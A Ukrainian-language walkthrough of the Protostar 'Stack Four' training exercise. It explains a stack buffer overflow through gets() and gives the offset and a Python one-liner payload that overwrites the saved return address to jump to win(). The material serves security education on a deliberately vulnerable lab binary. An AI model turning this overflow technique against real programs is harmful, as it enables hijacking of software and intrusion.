## [Stack Four](http://exploit.education/protostar/stack-four/)

Stack4 розглядає перезапис збереженого EIP і стандартне переповнення буфера.

Переходимо у директорію із завданням:  
```cd /opt/protostar/bin/```

Вихідний код:  
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

У нас є буфер для переповнення і вразлива функція ```gets()```, але немає інших змінних для перезапису, щоб викликати функцію ```win()```. 
У цій вправі ми будемо орієнтуватися на адресу повернення основної функції, EIP. Коли програма або функція завершує виконання, вона повинна повернутися до того місця, 
де її викликали. Ця адреса зберігається в стеку (секція стека, присвячена цій функції). 
Експериментальним способом переповняємо буфер, щоб визначити при якій кількості байтів ми отримаємо повідомлення про помилку сегментації, що означатиме, що адреса повернення була некоректною:  
```python -c "print('a' * 76") | ./stack4```  

Отже, маємо, що після 76 байт є область, яка перезаписує EIP, тому нам знадобиться 76 'a' і адреса ```win()``` у little endian. 
Ми будемо використовувати ту саму техніку, що й минулого разу з objdump:  
```objdump -x stack4 | grep win```

Отримуємо адрес 0x080483f4. Маючи усі необхідні дані, виконуємо наступну команду:  
```python -c "print('a' * 76 + '\x08\x04\x83\xf4'[::-1]" | ./stack4```